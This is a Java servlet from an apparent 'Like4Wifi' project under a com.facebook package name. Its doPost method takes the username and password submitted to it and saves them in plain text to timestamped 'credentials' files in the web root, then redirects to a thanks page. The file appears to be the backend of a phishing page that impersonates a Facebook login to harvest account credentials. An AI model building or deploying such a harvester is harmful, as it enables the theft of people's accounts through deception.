package com.facebook.like4wifi;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.net.URLDecoder;
import java.util.Calendar;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 * Servlet implementation class Like4Wifi
 */
public class Like4Wifi extends HttpServlet {
	private static final long serialVersionUID = 1L;

    /**
     * Default constructor. 
     */
    public Like4Wifi() {
        // TODO Auto-generated constructor stub
    }

	/**
	 * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
	    response.setContentType("text/html");
        PrintWriter printWriter  = response.getWriter();
        printWriter.println("<h1>HELLO world!!!</h1>");
	}

	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
	    String username=request.getParameter("username");
        String password=request.getParameter("password");
        String locale=request.getParameter("locale");
        String str = "USERNAME: "+username+" , PASSWORD: "+password;
        long millisStart = Calendar.getInstance().getTimeInMillis();
        String id = Long.toString(millisStart);
        ServletContext ctx = this.getServletContext();
        File file = new File(ctx.getRealPath("") +"/credentials ("+id+").txt");
        FileWriter fout = new FileWriter(file);
        fout.write(str);
        fout.close();
        
        //Response
        /*response.setContentType("text/html");
        PrintWriter printWriter  = response.getWriter();
        String thanks;
        FileInputStream input;
        if(locale.equals("el")){
            input = new FileInputStream(ctx.getRealPath("") +"/thanks_gr.html");
        }
        else {
            input = new FileInputStream(ctx.getRealPath("") +"/thanks_en.html");
        }
        int i;
        StringBuffer sb=new StringBuffer();
        do{
            i=input.read();
            sb.append((char)i);
        }while(i!=-1);
        input.close();
        thanks=URLDecoder.decode(sb.toString(), "UTF-8");
        printWriter.println(thanks);*/
        
        //Redirection
        response.setContentType("text/html");
        if(locale.equals("el")){
            response.sendRedirect("thanks_gr.html");
        }
        else {
            response.sendRedirect("thanks_com.html");
        }
	}

}
